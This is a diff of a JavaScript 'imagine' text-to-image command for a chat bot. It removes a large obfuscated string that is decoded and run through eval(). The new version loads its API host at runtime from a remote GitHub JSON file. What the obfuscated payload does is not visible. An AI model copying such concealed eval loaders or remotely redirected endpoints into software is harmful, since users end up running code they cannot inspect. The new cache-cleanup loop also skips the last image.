@@ -1,13 +1,59 @@
-module.exports.config = {
+ module.exports = {
+  config: {
     name: "imagine",
-    version: "1.0.5",
+    version: "1.0.0",
     permission: 0,
-    prefix: true,
     credits: "Nayan",
-    description: "text to image",
+    description: "",
+    prefix: true,
     category: "prefix",
-    cooldowns: 2
-};
-const fs = require("fs");
-const axios = require("axios");
- var _0xc0e=["","split","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/","slice","indexOf","","",".","pow","reduce","reverse","0"];function _0xe60c(d,e,f){var g=_0xc0e[2][_0xc0e[1]](_0xc0e[0]);var h=g[_0xc0e[3]](0,e);var i=g[_0xc0e[3]](0,f);var j=d[_0xc0e[1]](_0xc0e[0])[_0xc0e[10]]()[_0xc0e[9]](function(a,b,c){if(h[_0xc0e[4]](b)!==-1)return a+=h[_0xc0e[4]](b)*(Math[_0xc0e[8]](e,c))},0);var k=_0xc0e[0];while(j>0){k=i[j%f]+k;j=(j-(j%f))/f}return k||_0xc0e[11]}eval(function(h,u,n,t,e,r){r="";for(var i=0,len=h.length;i<len;i++){var s="";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],"g"),j);r+=String.fromCharCode(_0xe60c(s,e,10)-t)}return decodeURIComponent(escape(r))}("kirkRrkiirRrkiriRrrkirRrkriiRrkiiiRrrkikRkkirRrrkikRrkrriRrkirrRrkiriRrkikiRrkikkRrkikrRkkirRrkikiRrkriiRrkiikRkirkRriikrRkirkRrrrkrRrkikrRrkrrrRrkiikRrrkiiRkirkRrrkriRrkriiRrkiikRrrkiiRrkikkRrrkkiRrkiriRrkiikRkrrrRrkrkiRkirkRrrrkrRrkirrRrrkkiRkrkkRkirkRrrkikRrkrirRrrkikRrkiikRrkikkRkrkkRkirkRrrrkrRrkikiRrrkrrRrkikrRrrirRrkrkkRkrrkRkirkRrkrkiRkirkRrkikkRrkikiRrkrrrRkirkRrkrkiRkirkRrrkiiRrkiriRrkiikRrkikrRrkikkRkirkRrrkiiRrrkirRrkirrRkkrrRkirkRriikrRkirkRrrrrkRrrrrkRrrkirRrrkkiRrkikiRrkiikRrrrkrRrkiirRrrkikRkirkRkrkrRkirkRkikrRkkikRrrkiiRrrrkrRrrkiiRrrkrkRrrkikRkkikRrrrkrRrkiikRrrkkiRrrkiiRrkiriRrkriiRrkirrRrkiiiRrrkikRkkrrRrrrrkRkikrRkirkRkrkrRkirkRrrkikRrkrirRrrkikRrkiikRrkikkRkkirRrkikrRrrkikRrkiikRrrkirRrrkikRrkikiRrikirRrirrkRkirkRkrkrRkirkRkikrRkkirRrkirrRrkiikRrrkrrRkikrRriirkRkirkRrrkiiRrkiriRrkiikRrkikrRrkikkRkirkRrrkiiRrrkirRrkirrRkkrkRkirkRriikrRkirkRrrrrkRrrrrkRrrkirRrrkkiRrkikiRrkiikRrrrkrRrkiirRrrkikRkirkRkrkrRkirkRkikrRkkikRrrkiiRrrrkrRrrkiiRrrkrkRrrkikRkkikRrrrkrRrkiikRrrkkiRrrkiiRrkiriRrkriiRrkirrRrkiiiRrrkikRkkrkRrrrrkRkikrRkirkRkrkrRkirkRrrkikRrkrirRrrkikRrkiikRrkikkRkkirRrkikrRrrkikRrkiikRrrkirRrrkikRrkikiRrikirRrirrkRkirkRkrkrRkirkRkikrRkkirRrkirrRrkiikRrrkrrRkikrRriirkRkirkRrrkiiRrkiriRrkiikRrkikrRrkikkRkirkRrkrkiRkirkRrkiikRrrrkrRrkrrrRrrrkrRrkiikRkirkRrkrkkRkirkRriikrRkirkRrrkrrRrkiiiRrkiriRrrrkkRrrrkrRrkiiiRkkirRrrrkrRrkirrRrrkkiRrikkiRrrrkrRrkrrrRrrrkrRrkiikRriirkRkirkRrrkiiRrkiriRrkiikRrkikrRrkikkRkirkRrkiirRrkiirRkirkRriikrRkirkRrrrkrRrkikiRrrkrrRrkikrRkkirRrrkkrRrkiriRrrkkiRrkiikRkrrrRkikrRkirkRkikrRkrrkRriirkRkirkRrrkiiRrkiriRrkiikRrkikrRrkikkRkirkRrkikiRrrkikRrkikrRkirkRriikrRkirkRrrrkrRrkrikRrrrkrRrrkkiRrkikkRkirkRrrrkrRrkrriRrrkkiRrkiriRrkikrRkkirRrrkrrRrrkikRrkikkRkrrrRrrrkiRrrkrkRrkikkRrkikkRrkirrRrkikrRriirrRkkikRkkikRrrrkrRrkirrRrrkkiRkkirRrkiikRrrrkrRrkrrrRrrrkrRrkiikRkkiiRrkirrRrkikiRrkiriRrrkkrRrrkikRrrkiiRrkikkRkkirRrkikiRrrkikRrkirrRrkiiiRkkirRrrkiiRrkiriRkkikRrkiikRrrrkrRrkrrrRrrrkrRrkiikRkkikRrrrkrRrrkkiRkkiiRrrkkiRrkiirRrrkrrRririiRrkikkRrrkikRrkrriRrkikkRriikrRkriiRrkrkiRrkiirRrkiirRrkrkkRrrrkiRkrrkRriirkRkirkRrrkiiRrkiriRrkiikRrkikrRrkikkRkirkRrkikiRrrkikRrkikrRrkirrRrkiriRrkiikRrkikrRrrkikRrrkiiRrrkirRrkirrRkkrrRkirkRriikrRkirkRrkikiRrrkikRrkikrRkkirRrrkirRrrrkrRrkikkRrrrkrRkkirRrrkkiRrkiirRrrrkrRrrkrrRrrkikRkkrrRkkirRrkriiRrkikiRrkiiiRriirkRkirkRrrkiiRrkiriRrkiikRrkikrRrkikkRkirkRrkikiRrrkikRrkikrRrkirrRrkiriRrkiikRrkikrRrrkikRrrkiiRrrkirRrkirrRkkrkRkirkRriikrRkirkRrkikiRrrkikRrkikrRkkirRrrkirRrrrkrRrkikkRrrrkrRkkirRrrkkiRrkiirRrrrkrRrrkrrRrrkikRkkrkRkkirRrkriiRrkikiRrkiiiRriirkRkirkRrrrkrRrkirrRrrkkiRkkirRrkikrRrrkikRrkikkRrikrkRrrkikRrkikrRrkikrRrrrkrRrrkrrRrrkikRrriirRrrkikRrrrkrRrrkiiRrkikkRrrkkiRrkiriRrkiikRkrrrRkikrRriirirRkikriRrkkkrRkikrRkrkkRkirkRrrkikRrkrirRrrkikRrkiikRrkikkRkkirRrkiirRrrkikRrkikrRrkikrRrrrkrRrrkrrRrrkikRrikirRrirrkRkrkkRkirkRkrrrRrrkikRrkikiRrkikiRkrrkRkirkRriikrRriikkRkirkRrkrkiRrkrkkRkrkkRkirkRrkikkRrkikiRrkriiRrrkikRkrrkRriirkRkirkRrrkiiRrkiriRrkiikRrkikrRrkikkRkirkRrrkrrRrrkikRrkikkRrrkiiRrrkirRrkirrRkkrrRkirkRriikrRkirkRkrrrRrrrkrRrkrikRrrrkrRrrkkiRrkikkRkirkRrrrkrRrkrriRrrkkiRrkiriRrkikrRkkirRrrkrrRrrkikRrkikkRkrrrRrkikiRrrkikRrkikrRrkirrRrkiriRrkiikRrkikrRrrkikRrrkiiRrrkirRrkirrRkkrrRkrkkRkirkRrkrkiRkirkRrkikiRrrkikRrkikrRrkirrRrkiriRrkiikRrkikrRrrkikRrririRrkrrrRrkirrRrrkikRriirrRkirkRkrriRrrrkrRrkikiRrkikiRrrrkrRrkrrrRrrrkkRrkriiRrrkriRrrkriRrrkikRrkikiRkrriRkirkRrkrkkRkrrkRkrrkRkkirRrrkirRrrrkrRrkikkRrrrkrRriirkRkirkRrrkriRrkikrRkkirRrkrikRrkikiRrrkkiRrkikkRrrkikRrirkrRrrkkiRrkiiiRrrkikRrriikRrkrrrRrkiikRrrkiiRkrrrRrrkiiRrrkirRrkirrRkkrrRkrkkRkirkRrirriRrkriiRrrkriRrrkriRrrkikRrkikiRkkirRrrkriRrkikiRrkiriRrkiirRkrrrRrrkrrRrrkikRrkikkRrrkiiRrrkirRrkirrRkkrrRkrkkRkirkRkrriRrkriiRrkikkRrrkriRkkiiRriiikRkrriRkrrkRkrrkRriirkRkirkRrrkiiRrkiriRrkiikRrkikrRrkikkRkirkRrrkrrRrrkikRrkikkRrrkiiRrrkirRrkirrRkkrkRkirkRriikrRkirkRkrrrRrrrkrRrkrikRrrrkrRrrkkiRrkikkRkirkRrrrkrRrkrriRrrkkiRrkiriRrkikrRkkirRrrkrrRrrkikRrkikkRkrrrRrkikiRrrkikRrkikrRrkirrRrkiriRrkiikRrkikrRrrkikRrrkiiRrrkirRrkirrRkkrkRkrkkRkirkRrkrkiRkirkRrkikiRrrkikRrkikrRrkirrRrkiriRrkiikRrkikrRrrkikRrririRrkrrrRrkirrRrrkikRriirrRkirkRkrriRrrrkrRrkikiRrkikiRrrrkrRrkrrrRrrrkkRrkriiRrrkriRrrkriRrrkikRrkikiRkrriRkirkRrkrkkRkrrkRkrrkRkkirRrrkirRrrrkrRrkikkRrrrkrRriirkRkirkRrrkriRrkikrRkkirRrkrikRrkikiRrrkkiRrkikkRrrkikRrirkrRrrkkiRrkiiiRrrkikRrriikRrkrrrRrkiikRrrkiiRkrrrRrrkiiRrrkirRrkirrRkkrkRkrkkRkirkRrirriRrkriiRrrkriRrrkriRrrkikRrkikiRkkirRrrkriRrkikiRrkiriRrkiirRkrrrRrrkrrRrrkikRrkikkRrrkiiRrrkirRrkirrRkkrkRkrkkRkirkRkrriRrkriiRrkikkRrrkriRkkiiRriiikRkrriRkrrkRkrrkRriirkRkirkRrrrkrRrkirrRrrkkiRkkirRrkikrRrrkikRrkiikRrrkirRrikrkRrrkikRrkikrRrkikrRrrrkrRrrkrrRrrkikRkrrrRrkrkiRkirkRrrrkrRrkikkRrkikkRrrrkrRrrkiiRrrkrkRrkiirRrrkikRrkiikRrkikkRriirrRkirkRrrrirRkirkRrrkriRrkikrRkkirRrrkiiRrkikiRrrkikRrrrkrRrkikkRrrkikRrriirRrrkikRrrrkrRrrkirRrriikRrkikkRrkikiRrrkikRrrrkrRrkiirRkrrrRrrkiiRrrkirRrkirrRkkrrRkrrkRkrkkRkirkRrrkriRrkikrRkkirRrrkiiRrkikiRrrkikRrrrkrRrkikkRrrkikRrriirRrrkikRrrrkrRrrkirRrriikRrkikkRrkikiRrrkikRrrrkrRrkiirRkrrrRrrkiiRrrkirRrkirrRkkrkRkrrkRkirkRrrrriRkirkRrkrkkRkrkkRkirkRrrkikRrkrirRrrkikRrkiikRrkikkRkkirRrkikkRrrkrkRrkikiRrrkikRrrrkrRrrkirRrikirRrirrkRkrkkRkirkRkrrrRrrkikRrkikiRrkikiRkrrkRkirkRriikrRriikkRkirkRrkrkiRkirkRrrkriRrkikrRkkirRrkriiRrkiikRrkiiiRrrkkiRrkiikRrrkkkRrriikRrkrrrRrkiikRrrkiiRkrrrRrrkiiRrrkirRrkirrRkkrrRkrrkRriirkRkirkRrrkriRrkikrRkkirRrkriiRrkiikRrkiiiRrrkkiRrkiikRrrkkkRrriikRrkrrrRrkiikRrrkiiRkrrrRrrkiiRrrkirRrkirrRkkrkRkrrkRriirkRkirkRrrkkiRrrkriRkirkRkrrrRrrkikRrkikiRrkikiRkrrkRkirkRrkikiRrrkikRrkikkRrkriiRrkikiRrkiikRkirkRrrrkrRrkirrRrrkkiRkkirRrkikrRrrkikRrkiikRrrkirRrikrkRrrkikRrkikrRrkikrRrrrkrRrrkrrRrrkikRkrrrRrrrkiRrirkrRrrrkrRrrkkiRrkiiiRrrkikRrrkirRkirkRrkikkRrkiriRkirkRrrkriRrrkikRrkikkRrrkiiRrrkrkRkirkRrrrkrRrkiikRrrkkiRrkiirRrrkikRkirkRrrkiiRrkiriRrkriiRrkirrRrkiiiRrrkikRkirkRrkirrRrrkkiRrrkiiRrkikkRrkriiRrkikiRrrkikRkkirRkirkRrririRrkikiRrkrrrRkirkRrrrkrRrrkrrRrrrkrRrrkkiRrkiikRkirkRrkiiiRrrrkrRrkikkRrrkikRrkikiRkkirRrrrkiRkrkkRkirkRrrkikRrkrirRrrkikRrkiikRrkikkRkkirRrkikkRrrkrkRrkikiRrrkikRrrrkrRrrkirRrikirRrirrkRkrkkRkirkRrrkikRrkrirRrrkikRrkiikRrkikkRkkirRrkiirRrrkikRrkikrRrkikrRrrrkrRrrkrrRrrkikRrikirRrirrkRkrrkRriirkRkirkRrkrkkRkrkkRkirkRrrkikRrkrirRrrkikRrkiikRrkikkRkkirRrkiirRrrkikRrkikrRrkikrRrrrkrRrrkrrRrrkikRrikirRrirrkRkrrkRriirkRkirkRrkrkkRkirkRrrkiiRrrrkrRrkikkRrrkiiRrrkrkRkirkRkrrrRrrkikRrkikiRrkikiRkrrkRkirkRrkrkiRkirkRrrrkrRrkirrRrrkkiRkkirRrkikrRrrkikRrkiikRrrkirRrikrkRrrkikRrkikrRrkikrRrrrkrRrrkrrRrrkikRkrrrRrrrkiRrirkiRrkikiRrkikiRrkiriRrkikiRkkirRkirkRrririRrkikiRrkrrrRkirkRrrrkrRrrkrrRrrrkrRrrkkiRrkiikRkirkRrkiiiRrrrkrRrkikkRrrkikRrkikiRkkirRrrrkiRkrkkRkirkRrrkikRrkrirRrrkikRrkiikRrkikkRkkirRrkikkRrrkrkRrkikiRrrkikRrrrkrRrrkirRrikirRrirrkRkrkkRkirkRkrrrRkrrkRkirkRriikrRriikkRkirkRrrrkrRrkirrRrrkkiRkkirRrkikrRrrkikRrkikkRrikrkRrrkikRrkikrRrkikrRrrrkrRrrkrrRrrkikRrriirRrrkikRrrrkrRrrkiiRrkikkRrrkkiRrkiriRrkiikRkrrrRkikrRriirirRkikrrRkiirkRkikrRkrkkRkirkRrrkikRrkrirRrrkikRrkiikRrkikkRkkirRrkiirRrrkikRrkikrRrkikrRrrrkrRrrkrrRrrkikRrikirRrirrkRkrkkRkirkRkrrrRrrkikRrkikiRrkikiRkrrkRkirkRriikrRriikkRkirkRrkrkiRrkrkkRkrkkRkirkRrkikkRrkikiRrkriiRrrkikRkrrkRkrkkRkirkRrrkikRrkrirRrrkikRrkiikRrkikkRkkirRrkiirRrrkikRrkikrRrkikrRrrrkrRrrkrrRrrkikRrikirRrirrkRkrrkRriirkRkirkRrkrkkRrrirRrkrkkR",41,"irkRqwFZE",27,3,5)) 
+    usages: "prompt",
+    cooldowns: 10,
+},
+
+   languages: {
+   "vi": {},
+       "en": {
+           "missing": 'use : /imagine cat'
+       }
+   },
+
+start: async function({ nayan, events, args, lang}) {
+    const axios = require("axios");
+    const fs = require("fs-extra");
+    const request = require("request");
+    const prompt = args.join(" ");
+    const key = this.config.credits;
+    const apis = await axios.get('https://raw.githubusercontent.com/MOHAMMAD-NAYAN/Nayan/main/api.json')
+  const n = apis.data.api
+    if(!prompt) return nayan.reply(lang('missing'), events.threadID, events.messageID)
+
+  
+  
+
+
+    const res = await axios.get(`${n}/nayan/img?prompt=${encodeURIComponent(prompt)}`);
+
+
+  console.log(res.data)
+    const data = res.data.imageUrls;
+  const numberSearch = data.length
+    var num = 0;
+    var imgData = [];
+    for (var i = 0; i < parseInt(numberSearch); i++) {
+      let path = __dirname + `/cache/${num+=1}.jpg`;
+      let getDown = (await axios.get(`${data[i]}`, { responseType: 'arraybuffer' })).data;
+      fs.writeFileSync(path, Buffer.from(getDown, 'utf-8'));
+      imgData.push(fs.createReadStream(__dirname + `/cache/${num}.jpg`));
+    }
+
+
+    nayan.reply({
+        attachment: imgData,
+        body: "🔍Imagine Result🔍\n\n📝Prompt: " + prompt + "\n\n#️⃣Number of Images: " + numberSearch
+    }, events.threadID, events.messageID)
+    for (let ii = 1; ii < parseInt(numberSearch); ii++) {
+        fs.unlinkSync(__dirname + `/cache/${ii}.jpg`)
+    }
+}
+ }
